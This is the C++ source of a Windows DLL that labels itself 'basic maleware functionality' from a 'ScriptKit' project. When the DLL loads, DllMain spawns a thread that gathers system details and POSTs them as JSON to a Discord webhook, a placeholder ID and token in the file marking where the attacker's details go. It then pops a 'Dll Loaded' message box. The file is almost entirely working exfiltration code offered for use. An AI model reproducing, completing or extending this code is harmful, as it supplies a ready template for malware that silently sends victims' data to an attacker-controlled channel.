/*

                                SCRIPTKIT OFFICIAL DLL SOURCE

                     =====================================================

                                        Version: 0.0.1
                            Description: basic maleware functionality.
        Method: Connects using TCP, lists system specs and sends it through discord webhook.

*/
#include <windows.h>
#include <string>
#include <sstream>
#include <winhttp.h>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

#pragma comment(lib, "winhttp.lib")

void SendWebhookMessage(const std::wstring& webhookPath, const std::string& message)
{
    HINTERNET hSession = WinHttpOpen(
        L"DiscordWebhook/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession)
        return;

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        L"discord.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        webhookPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    json j;
    j["content"] = message;

    std::string payload = j.dump();

    BOOL result = WinHttpSendRequest(
        hRequest,
        L"Content-Type: application/json\r\n",
        -1L,
        (LPVOID)payload.c_str(),
        payload.length(),
        payload.length(),
        0
    );

    if (result)
    {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

std::string getOS()
{
    return "Windows";
}

std::string getArch()
{
#if INTPTR_MAX == INT64_MAX
    return "64-bit";
#else
    return "32-bit";
#endif
}

std::string getSystemSpecs()
{
    json j;

    j["os"] = getOS();
    j["architecture"] = getArch();

    return j.dump();
}

DWORD WINAPI MainThread(LPVOID lpParam)
{
    std::wstring webhookPath =
        L"/api/webhooks/YOUR_ID/YOUR_TOKEN";

    SendWebhookMessage(
        webhookPath,
        getSystemSpecs()
    );

    MessageBoxA(
        NULL,
        "Dll Loaded",
        "Scriptus",
        MB_OK
    );

    return 0;
}

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        DisableThreadLibraryCalls(hModule);

        HANDLE hThread = CreateThread(
            NULL,
            0,
            MainThread,
            NULL,
            0,
            NULL
        );

        if (hThread)
            CloseHandle(hThread);

        break;
    }
    }

    return TRUE;
}